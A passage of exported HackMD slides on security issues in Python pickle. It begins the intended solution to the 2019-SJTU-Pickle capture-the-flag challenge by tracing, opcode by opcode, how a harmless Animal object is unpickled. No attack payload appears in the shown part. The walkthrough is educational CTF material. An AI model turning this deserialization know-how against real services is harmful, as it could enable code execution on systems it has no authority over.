</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/43"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">44</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 185px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/44&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;45&lt;/span&gt;&lt;/a&gt;"><div><h2 class="raw part" data-startline="NaN" data-endline="NaN">Unintended</h2>
<p class="part" data-startline="NaN" data-endline="NaN" data-position="NaN" data-size="0"><img src="./Security Issues in Python Pickle - HackMD_files/c8177f3e6709c93d2b3d65129a3df8dcd0005403.jpg" alt="" class="" data-position="NaN" data-size="160"></p>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/44"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">45</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 329px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/45&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;46&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Intended Solution for <a href="http://web.hitctf.cn:10018/" target="_blank" rel="noopener">2019-SJTU-Pickle</a></h4>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/45"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">46</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 304px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/46&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;47&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Analysis the process of unpickling an normal Anmial instance</h4>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/46"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">47</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 329px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/47&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;48&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Pickle is able to solve module import</h4>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/47"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">48</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 144px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/48&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;49&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs"><span class="hljs-keyword">import</span> pickle

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Animal</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, name, category</span>):</span>
        self.name = name
        self.category = category

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__repr__</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">f'Animal(name=<span class="hljs-subst">{self.name!r}</span>, category=<span class="hljs-subst">{self.category!r}</span>)'</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__eq__</span>(<span class="hljs-params">self, other</span>):</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">type</span>(other) <span class="hljs-keyword">is</span> Animal <span class="hljs-keyword">and</span> self.name == other.name <span class="hljs-keyword">and</span> self.category == other.category


print(pickle.dumps(Animal(name=<span class="hljs-string">"x"</span>, category=<span class="hljs-string">"y"</span>)))
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/48"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">49</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 325.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/49&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;50&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">\x80\x03c__main__\nAnimal\nq\x00)\x81q\x01}q\x02(X\x04\x00\x00\x00nameq\x03X\x01\x00\x00\x00xq\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/49"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">50</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 119px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/50&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;51&lt;/span&gt;&lt;/a&gt;"><div><h4 class="raw part" data-startline="NaN" data-endline="NaN">Normal Animal</h4>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">$ python3 -m pickletools ./payload
    <span class="hljs-number">0</span>: \x80 PROTO      <span class="hljs-number">3</span>
    <span class="hljs-number">2</span>: c    GLOBAL     <span class="hljs-string">'__main__ Animal'</span>
   <span class="hljs-number">19</span>: q    BINPUT     <span class="hljs-number">0</span>
   <span class="hljs-number">21</span>: )    EMPTY_TUPLE
   <span class="hljs-number">22</span>: \x81 NEWOBJ
   <span class="hljs-number">23</span>: q    BINPUT     <span class="hljs-number">1</span>
   <span class="hljs-number">25</span>: }    EMPTY_DICT
   <span class="hljs-number">26</span>: q    BINPUT     <span class="hljs-number">2</span>
   <span class="hljs-number">28</span>: (    MARK
   <span class="hljs-number">29</span>: X        BINUNICODE <span class="hljs-string">'name'</span>
   <span class="hljs-number">38</span>: q        BINPUT     <span class="hljs-number">3</span>
   <span class="hljs-number">40</span>: X        BINUNICODE <span class="hljs-string">'x'</span>
   <span class="hljs-number">46</span>: q        BINPUT     <span class="hljs-number">4</span>
   <span class="hljs-number">48</span>: X        BINUNICODE <span class="hljs-string">'category'</span>
   <span class="hljs-number">61</span>: q        BINPUT     <span class="hljs-number">5</span>
   <span class="hljs-number">63</span>: X        BINUNICODE <span class="hljs-string">'y'</span>
   <span class="hljs-number">69</span>: q        BINPUT     <span class="hljs-number">6</span>
   <span class="hljs-number">71</span>: u        SETITEMS   (MARK at <span class="hljs-number">28</span>)
   <span class="hljs-number">72</span>: b    BUILD
   <span class="hljs-number">73</span>: .    STOP
highest protocol among opcodes = <span class="hljs-number">2</span>
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/50"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">51</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 144px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/51&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;52&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs"><span class="hljs-keyword">from</span> lib <span class="hljs-keyword">import</span> pickle

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Animal</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, name, category</span>):</span>
        self.name = name
        self.category = category

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__repr__</span>(<span class="hljs-params">self</span>):</span>
        name = <span class="hljs-literal">None</span>
        category = <span class="hljs-literal">None</span>
        <span class="hljs-keyword">try</span>:
            name = self.name
            category = self.category
            <span class="hljs-keyword">return</span> <span class="hljs-string">f'Animal(name=<span class="hljs-subst">{name!r}</span>, category=<span class="hljs-subst">{category!r}</span>)'</span>
        <span class="hljs-keyword">except</span> AttributeError:
            <span class="hljs-keyword">return</span> <span class="hljs-string">f'Animal(name=<span class="hljs-subst">{name!r}</span>, category=<span class="hljs-subst">{category!r}</span>)'</span>


    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__eq__</span>(<span class="hljs-params">self, other</span>):</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">type</span>(other) <span class="hljs-keyword">is</span> Animal <span class="hljs-keyword">and</span> self.name == other.name <span class="hljs-keyword">and</span> self.category == other.category

pickle.loads(<span class="hljs-string">b'\x80\x03c__main__\nAnimal\nq\x00)\x81q\x01}q\x02(X\x04\x00\x00\x00nameq\x03X\x01\x00\x00\x00xq\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.'</span>)

</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/51"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">52</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 216px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/52&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;53&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">\x80\x03
c__main__\nAnimal\nq\x00)\x81q\x01}q\x02(X\x04\x00\x00\x00nameq\x03X\x01\x00\x00\x00xq\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">PROTO Protocol version indicator.

Byte: <span class="hljs-string">b'\x80'</span>
Stack: []
Meta Stack: []
Memo: {}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/52"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">53</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 216px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/53&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;54&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">c__main__\nAnimal\n
q\x00)\x81q\x01}q\x02(X\x04\x00\x00\x00nameq\x03X\x01\x00\x00\x00xq\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">GLOBAL Push a <span class="hljs-keyword">global</span> <span class="hljs-built_in">object</span> (module.attr) on the stack.

Byte: <span class="hljs-string">b'c'</span>
Stack: []
Meta Stack: []
Memo: {}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/53"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">54</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 202.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/54&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;55&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">q\x00
)\x81q\x01}q\x02(X\x04\x00\x00\x00nameq\x03X\x01\x00\x00\x00xq\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">BINPUT Store the stack top into the memo.
The stack is not popped.

Byte: b'q'
Stack: [&lt;class '__main__.Animal'&gt;]
Meta Stack: []
Memo: {}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/54"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">55</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 216px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/55&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;56&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">)
\x81q\x01}q\x02(X\x04\x00\x00\x00nameq\x03X\x01\x00\x00\x00xq\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">EMPTY_TUPLE Push an empty tuple.

Byte: b')'
Stack: [&lt;class '__main__.Animal'&gt;]
Meta Stack: []
Memo: {0: &lt;class '__main__.Animal'&gt;}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/55"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">56</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 216px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/56&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;57&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">\x81
q\x01}q\x02(X\x04\x00\x00\x00nameq\x03X\x01\x00\x00\x00xq\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">NEWOBJ Build an object instance.

Byte: b'\x81'
Stack: [&lt;class '__main__.Animal'&gt;, ()]
Meta Stack: []
Memo: {0: &lt;class '__main__.Animal'&gt;}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/56"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">57</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 202.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/57&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;58&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">q\x01
}q\x02(X\x04\x00\x00\x00nameq\x03X\x01\x00\x00\x00xq\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">BINPUT Store the stack top into the memo.
The stack is not popped.

Byte: b'q'
Stack: [Animal(name=None, category=None)]
Meta Stack: []
Memo: {0: &lt;class '__main__.Animal'&gt;}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/57"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">58</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 216px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/58&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;59&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">}
q\x02(X\x04\x00\x00\x00nameq\x03X\x01\x00\x00\x00xq\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">EMPTY_DICT Push an empty dict.

Byte: b'}'
Stack: [Animal(name=None, category=None)]
Meta Stack: []
Memo: {0: &lt;class '__main__.Animal'&gt;, 1: Animal(name=None, category=None)}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/58"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">59</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 202.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/59&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;60&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">q\x02
(X\x04\x00\x00\x00nameq\x03X\x01\x00\x00\x00xq\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">BINPUT Store the stack top into the memo.
The stack is not popped.

Byte: b'q'
Stack: [Animal(name=None, category=None), {}]
Meta Stack: []
Memo: {0: &lt;class '__main__.Animal'&gt;, 1: Animal(name=None, category=None)}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/59"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">60</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 216px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/60&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;61&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">(
X\x04\x00\x00\x00nameq\x03X\x01\x00\x00\x00xq\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">MARK Push markobject onto the stack.

Byte: b'('
Stack: [Animal(name=None, category=None), {}]
Meta Stack: []
Memo: {0: &lt;class '__main__.Animal'&gt;, 1: Animal(name=None, category=None), 2: {}}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/60"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">61</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 216px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/61&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;62&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">X\x04\x00\x00\x00name
q\x03X\x01\x00\x00\x00xq\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">BINUNICODE Push a Python Unicode string object.

Byte: b'X'
Stack: []
Meta Stack: [[Animal(name=None, category=None), {}]]
Memo: {0: &lt;class '__main__.Animal'&gt;, 1: Animal(name=None, category=None), 2: {}}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/61"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">62</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 202.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/62&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;63&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">q\x03
X\x01\x00\x00\x00xq\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">BINPUT Store the stack top into the memo.
The stack is not popped.

Byte: b'q'
Stack: ['name']
Meta Stack: [[Animal(name=None, category=None), {}]]
Memo: {0: &lt;class '__main__.Animal'&gt;, 1: Animal(name=None, category=None), 2: {}}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/62"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">63</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 216px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/63&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;64&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">X\x01\x00\x00\x00x
q\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">BINUNICODE Push a Python Unicode string object.

Byte: b'X'
Stack: ['name']
Meta Stack: [[Animal(name=None, category=None), {}]]
Memo: {0: &lt;class '__main__.Animal'&gt;, 1: Animal(name=None, category=None), 2: {}, 3: 'name'}
</code></pre>
</div></section><div class="slide-number slide-number-pdf"><a href="https://hackmd.io/@2KUYNtTcQ7WRyTsBT7oePg/BycZwjKNX?print-pdf#/6/63"><span class="slide-number-a">7</span><span class="slide-number-delimiter">.</span><span class="slide-number-b">64</span></a></div></div><div class="pdf-page" style="height: 727px;"><div class="slide-background future" data-loaded="true" style="display: block;"><div class="slide-background-content"></div></div><section data-markdown="" data-markdown-parsed="true" class="present" aria-hidden="true" hidden="" style="display: block; left: 19px; top: 202.5px; width: 960px;" data-slide-number="&lt;a href=&quot;#/6/64&quot;&gt;&lt;span class=&quot;slide-number-a&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;slide-number-delimiter&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;slide-number-b&quot;&gt;65&lt;/span&gt;&lt;/a&gt;"><div><pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">q\x04
X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.
</code></pre>
<pre class="part" data-startline="NaN" data-endline="NaN" data-position="NaN"><code class="python hljs">BINPUT Store the stack top into the memo.
The stack is not popped.

Byte: b'q'
Stack: ['name', 'x']
Meta Stack: [[Animal(name=None, category=None), {}]]
Memo: {0: &lt;class '__main__.Animal'&gt;, 1: Animal(name=None, category=None), 2: {}, 3: 'name'}
